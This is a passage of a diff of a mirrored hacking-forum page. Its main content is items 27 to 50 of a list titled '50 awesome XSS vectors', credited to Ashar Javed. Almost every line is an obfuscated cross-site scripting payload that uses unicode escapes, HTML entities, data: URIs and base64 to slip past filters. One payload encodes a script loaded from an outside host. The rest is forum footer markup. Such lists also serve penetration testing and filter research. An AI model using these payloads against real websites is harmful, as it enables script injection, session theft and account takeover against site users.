+27) &lt;a href="data:text/html;base64_,&lt;svg/onload=\u0061&amp;#x6C;&amp;#101%72t(1)&gt;"&gt;X&lt;/a<br/>
+ <br/>
+28) &lt;iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE&gt;<br/>
+ <br/>
+29) &lt;script&gt;~'\u0061' ;  \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073.  \u0061\u006C\u0065\u0072\u0074(~'\u0061')&lt;/script U+<br/>
+ <br/>
+30) &lt;script/src="data&amp;colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')"&gt;&lt;/script a=\u0061 &amp; /=%2F<br/>
+ <br/>
+31)  &lt;script/src=data&amp;colon;text/j\u0061v\u0061&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116,\u0061%6C%65%72%74(/XSS/)&gt;&lt;/script ​​​​​​​​​​​​<br/>
+ <br/>
+32) &lt;object data=javascript&amp;colon;\u0061&amp;#x6C;&amp;#101%72t(1)&gt;<br/>
+ <br/>
+33) &lt;script&gt;+-+-1-+-+alert(1)&lt;/script&gt;<br/>
+ <br/>
+34) &lt;body/onload=&amp;lt;!--&amp;gt;&amp;#10alert(1)&gt;<br/>
+ <br/>
+35) &lt;script itworksinallbrowsers&gt;/*&lt;script* */alert(1)&lt;/script ​<br/>
+ <br/>
+36) &lt;img src ?itworksonchrome?\/onerror = alert(1)​​​<br/>
+ <br/>
+37) &lt;svg&gt;&lt;script&gt;//&amp;NewLine;confirm(1);&lt;/script &lt;/svg&gt;<br/>
+ <br/>
+38) &lt;svg&gt;&lt;script onlypossibleinopera:-)&gt; alert(1)<br/>
+ <br/>
+39) &lt;a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa  aaaaaaaaa aaaaaaaaaa  href=j&amp;#97v&amp;#97script&amp;#x3A;&amp;#97lert(1)&gt;ClickMe<br/>
+ <br/>
+40) &lt;script x&gt; alert(1) &lt;/script 1=2<br/>
+ <br/>
+41) &lt;div/onmouseover='alert(1)'&gt; style="x:"&gt;<br/>
+ <br/>
+42)  &lt;--`&lt;img/src=` onerror=alert(1)&gt; --!&gt;<br/>
+ <br/>
+43)  &lt;script/src=&amp;#100&amp;#97&amp;#116&amp;#97:text/&amp;#x6a&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x000070&amp;#x074,&amp;#x0061;&amp;#x06c;&amp;#x0065;&amp;#x00000072;&amp;#x00074;(1)&gt;&lt;/script&gt; ​<br/>
+ <br/>
+44) &lt;div  style="position:absolute;top:0;left:0;width:100%;height:100%"  onmouseover="prompt(1)" onclick="alert(1)"&gt;x&lt;/button&gt;​<br/>
+ <br/>
+45) "&gt;&lt;img src=x onerror=window.open('https://www.google.com/');&gt;<br/>
+ <br/>
+46) &lt;form&gt;&lt;button formaction=javascript&amp;colon;alert(1)&gt;CLICKME<br/>
+ <br/>
+47) &lt;math&gt;&lt;a xlink:href="//jsfiddle.net/t846h/"&gt;click<br/>
+ <br/>
+48) &lt;object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+&gt;&lt;/object&gt;​<br/>
+ <br/>
+49) &lt;iframe  src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"&gt;&lt;/iframe&gt;<br/>
+ <br/>
+          50) &lt;a  href="data:text/html;blabla,&amp;#60&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116&amp;#32&amp;#115&amp;#114&amp;#99&amp;#61&amp;#34&amp;#104&amp;#116&amp;#116&amp;#112&amp;#58&amp;#47&amp;#47&amp;#115&amp;#116&amp;#101&amp;#114&amp;#110&amp;#101&amp;#102&amp;#97&amp;#109&amp;#105&amp;#108&amp;#121&amp;#46&amp;#110&amp;#101&amp;#116&amp;#47&amp;#102&amp;#111&amp;#111&amp;#46&amp;#106&amp;#115&amp;#34&amp;#62&amp;#60&amp;#47&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116&amp;#62&amp;#8203"&gt;Click  Me&lt;/a&gt;</code><hr/>
+</div>Source:<a href="../external.html?link=http://pastebin.com/mQDbu7Sm" target="_blank">50 awesome XSS vectors that I have tweeted (@soaj1664ashar) over time. Enjoy! No - Pastebin.com</a><br/>
+<br/>
 Credits:Ashar Javed</blockquote>
 	</div>
 </li>
@@ -285,14 +282,14 @@ Credits:Ashar Javed</blockquote>
 
 </div>
 <div class="below_body">
-<div id="footer_time" class="footer_time">All times are GMT +5.5. The time now is <span class="time">05:07 PM</span>.</div>
+<div class="footer_time" id="footer_time">All times are GMT +5.5. The time now is <span class="time">05:07 PM</span>.</div>
 
-<div id="footer_copyright" class="footer_copyright">
+<div class="footer_copyright" id="footer_copyright">
 	<!-- Do not remove this copyright notice -->
-	Powered by <a href="../external.html?link=https://www.vbulletin.com/" id="vbulletinlink">vBulletin&reg;</a> Version 4.2.1 <br />Copyright &copy; 2020 vBulletin Solutions, Inc. All rights reserved. 
+	Powered by <a href="../external.html?link=https://www.vbulletin.com/" id="vbulletinlink">vBulletin®</a> Version 4.2.1 <br/>Copyright © 2020 vBulletin Solutions, Inc. All rights reserved. 
 	<!-- Do not remove this copyright notice -->	
 </div>
-<div id="footer_morecopyright" class="footer_morecopyright">
+<div class="footer_morecopyright" id="footer_morecopyright">
 	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
 	
 	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
@@ -310,7 +307,7 @@ try{
 var pageTracker = _gat._getTracker('UA-17311051-3');
 pageTracker._trackPageview();
 } catch(err) {}</script>
-</body>
 
-<!-- Mirrored from garage4hackers.com/printthread.php?t=364&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 16:32:58 GMT -->
-</html>
+
+
+</body><!-- Mirrored from garage4hackers.com/printthread.php?t=364&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 16:32:58 GMT --></html>
